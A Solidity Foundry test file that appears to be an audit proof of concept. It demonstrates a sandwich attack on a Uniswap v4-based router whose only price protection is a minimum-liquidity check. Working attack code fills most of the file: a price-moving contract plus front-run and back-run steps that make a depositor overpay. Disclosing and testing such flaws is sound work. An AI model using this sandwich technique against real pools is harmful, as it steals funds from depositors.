// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;

import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {ValariRouterTest, RouterTestToken} from "./ValariRouter.t.sol";
import {ValariRouter} from "../src/ValariRouter.sol";

/// @dev Swaps toward an exact sqrt price, so the attacker can restore the pool precisely.
contract PriceMover is IUnlockCallback {
    IPoolManager internal immutable manager;

    constructor(IPoolManager manager_) {
        manager = manager_;
    }

    function moveTo(PoolKey calldata key, bool zeroForOne, uint160 target) external {
        manager.unlock(abi.encode(key, zeroForOne, target));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(manager));
        (PoolKey memory key, bool zeroForOne, uint160 target) =
            abi.decode(data, (PoolKey, bool, uint160));
        BalanceDelta delta = manager.swap(
            key,
            SwapParams({
                zeroForOne: zeroForOne,
                amountSpecified: -int256(1_000_000 ether),
                sqrtPriceLimitX96: target
            }),
            ""
        );
        _settle(key.currency0, delta.amount0());
        _settle(key.currency1, delta.amount1());
        return "";
    }

    function _settle(Currency currency, int128 amount) private {
        if (amount < 0) {
            manager.sync(currency);
            RouterTestToken(Currency.unwrap(currency))
                .transfer(address(manager), uint256(uint128(-amount)));
            manager.settle();
        } else if (amount > 0) {
            manager.take(currency, address(this), uint256(uint128(amount)));
        }
    }
}

/// @notice minLiquidity is the only price protection in openPosition. When the caller's
/// budgets are not tight, a sandwich can raise the minted liquidity while moving the
/// execution price arbitrarily far, so the check passes and the depositor pays for it.
contract ValariRouterPriceBoundPoC is ValariRouterTest {
    function testPoCLooseBudgetsLetSandwichPassMinLiquidity() public {
        // Background depth so the pool has a price path through Alice's range.
        _open(bob, 1_000 ether, 1_000 ether, -600, 1800);

        PriceMover attacker = new PriceMover(manager);
        token0.mint(address(attacker), 10_000 ether);
        token1.mint(address(attacker), 10_000 ether);
        uint256 attacker0 = token0.balanceOf(address(attacker));
        uint256 attacker1 = token1.balanceOf(address(attacker));

        // Alice wants a range above spot (price = 1, range ~[1.062, 1.127]): a token0-only
        // deposit. She passes a token1 budget as well and relies on the refund.
        ValariRouter.DepositQuote memory honest =
            router.previewDeposit(poolId, 100 ether, 130 ether, 600, 1200);
        assertEq(honest.amount1, 0, "honest deposit is token0 only");
        uint128 minLiquidity = honest.liquidity * 99 / 100;

        // Front-run: push spot above Alice's range (tick 1300).
        uint160 manipulated = 84_548_773_846_830_055_596_654_329_856; // ~sqrt(1.0001^1300) * 2^96
        attacker.moveTo(key, false, manipulated);

        vm.prank(alice);
        (uint256 id, uint128 minted, uint256 spent0, uint256 spent1) = router.openPosition(
            poolId, 100 ether, 130 ether, 600, 1200, minLiquidity, block.timestamp
        );
        assertGe(minted, minLiquidity, "slippage check passed");
        assertEq(spent0, 0, "deposit flipped to the other token");

        // Back-run: restore the original price, selling token0 into Alice's range.
        attacker.moveTo(key, true, SQRT_ONE);

        ValariRouter.PositionView memory p = router.getPosition(id);
        emit log_named_uint("honest liquidity      ", honest.liquidity);
        emit log_named_uint("minted liquidity      ", minted);
        emit log_named_decimal_uint("honest spend token0   ", honest.amount0, 18);
        emit log_named_decimal_uint("actual spend token1   ", spent1, 18);
        emit log_named_decimal_uint("position token0 after ", p.amount0 + p.fees0, 18);
        emit log_named_decimal_uint("position token1 after ", p.amount1 + p.fees1, 18);
        emit log_named_decimal_int(
            "attacker token0 delta ",
            int256(token0.balanceOf(address(attacker))) - int256(attacker0),
            18
        );
        emit log_named_decimal_int(
            "attacker token1 delta ",
            int256(token1.balanceOf(address(attacker))) - int256(attacker1),
            18
        );
        // At the restored price of 1.0 both tokens are worth the same, so Alice's loss is
        // what she paid minus what the position holds.
        uint256 held = p.amount0 + p.fees0 + p.amount1 + p.fees1;
        assertGt(spent1, held, "Alice overpaid");
        emit log_named_decimal_uint("Alice loss at price 1 ", spent1 - held, 18);
    }
}
